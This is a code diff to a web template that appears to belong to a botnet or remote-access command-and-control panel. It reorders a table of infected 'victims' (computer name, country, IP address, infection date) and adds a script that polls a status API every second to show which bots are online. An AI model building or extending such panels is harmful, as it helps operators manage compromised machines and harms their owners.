@@ -9,8 +9,8 @@
                 <thead class="thead-dark">
                     <tr>
                         <th scope="col">ID</th>
-                        <th scope="col">Country</th>
                         <th scope="col">Computer Name</th>
+                        <th scope="col">Country</th>
                         <th scope="col">UUID</th>
                         <th scope="col">IP Address</th>
                         <th scope="col">Date Infection</th>
@@ -18,7 +18,7 @@
                         <th scope="col">Status</th>
                     </tr>
                 </thead>
-                <tbody id="bots">
+                <tbody>
                     <% for (let c in clients) { 
                         const yearUpdate = clients[c].updatedAt.getFullYear()
                         const monthUpdate = (clients[c].updatedAt.getMonth() <= 9 ? '0' : '') + (clients[c].updatedAt.getMonth() + 1)
@@ -35,7 +35,7 @@
                         const clientInfectionDate = yearInfection + '-' + monthInfection + '-' + dayInfection + ' ' + hoursInfection + ':' + minutesInfection
                         
                     %>
-                        <tr id="<%= clients[c].uuid %>" data-href="/app/victims/<%= clients[c].uuid %>">
+                        <tr data-href="/app/victims/<%= clients[c].uuid %>">
                             <th id="id" scope="row"><%= clients[c].id %></th>
                             <td id="computerName"><%= clients[c].computerName %></td>
                             <td id="country"><%= ip_addresses[c].country %></td>
@@ -43,12 +43,41 @@
                             <td id="ip"><%= ip_addresses[c].ipAddress %></td>
                             <td><%= clientInfectionDate %></td>
                             <td><%= clientUpdateDate %></td>
-                            <td id="status" class="badge badge-pill badge-danger">Unreachable</td>
+                            <td><span id="status-<%= clients[c].uuid %>" class="badge badge-pill badge-danger">Unreachable</span></td>
                         </tr>
                     <% } %>
                 </tbody>
             </table>
         </div>
     </div>
+    <script>
+        (function status() {
+            const url = new URL(window.location.origin + '/api/clients/status')
 
+            $.ajax({
+                type: "GET",
+                url: url,
+            })
+                .done((statusArray) => {
+                    console.log("The AJAX request to get status is a success !")
+
+                    for (let i = 0; i < statusArray.length; i++) {
+                        if (statusArray[i].status === 'online') {
+                            document.getElementById('status-' + statusArray[i].uuid).innerText = "Online"
+                            document.getElementById('status-' + statusArray[i].uuid).className = "badge badge-pill badge-success"
+                        }
+                        else if (statusArray[i].status === 'offline') {
+                            document.getElementById('status-' + statusArray[i].uuid).innerText = "Offline"
+                            document.getElementById('status-' + statusArray[i].uuid).className = "badge badge-pill badge-danger"
+                        }
+                    }
+                })
+                .fail(() => {
+                    console.log("The AJAX request to get status failed ...")
+                    //alert("An error occurred ...")
+                })
+
+            setTimeout(status, 1000)
+        })()
+    </script>
 <%- include('../partials/footer'); %>
